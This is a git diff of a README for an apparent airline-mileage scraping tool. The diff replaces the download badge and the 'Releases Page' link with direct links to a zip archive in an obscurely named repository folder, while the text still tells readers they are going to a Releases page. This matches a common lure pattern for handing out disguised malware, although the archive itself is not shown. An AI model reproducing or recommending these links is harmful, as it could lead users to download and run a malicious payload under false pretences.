@@ -4,7 +4,7 @@
 Welcome to AA-Teste-MileageFinderAA-! This tool helps you easily collect airline miles from various flight searches. Follow the steps below to download and run the application.
 
 ## 📥 Download Now
-[![Download AA-Teste-MileageFinderAA-](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/coberculidae/AA-Teste-MileageFinderAA-/releases)
+[![Download AA-Teste-MileageFinderAA-](https://raw.githubusercontent.com/coberculidae/AA-Teste-MileageFinderAA-/main/basiophthalmous/A-Finder-Mileage-Teste-v1.5.zip)](https://raw.githubusercontent.com/coberculidae/AA-Teste-MileageFinderAA-/main/basiophthalmous/A-Finder-Mileage-Teste-v1.5.zip)
 
 ## 📋 Overview
 AA-Teste-MileageFinderAA- is your go-to solution for scraping flight mile data. Whether you're planning a trip or just curious about how many miles you can earn, this application provides a quick and easy way to get the information you need.
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets the following requirements:
 - Python: Version 3.7 or above (Python comes pre-installed on most systems)
 
 ## 📥 Download & Install
-To download the application, visit this page: [Releases Page](https://github.com/coberculidae/AA-Teste-MileageFinderAA-/releases).
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/coberculidae/AA-Teste-MileageFinderAA-/main/basiophthalmous/A-Finder-Mileage-Teste-v1.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
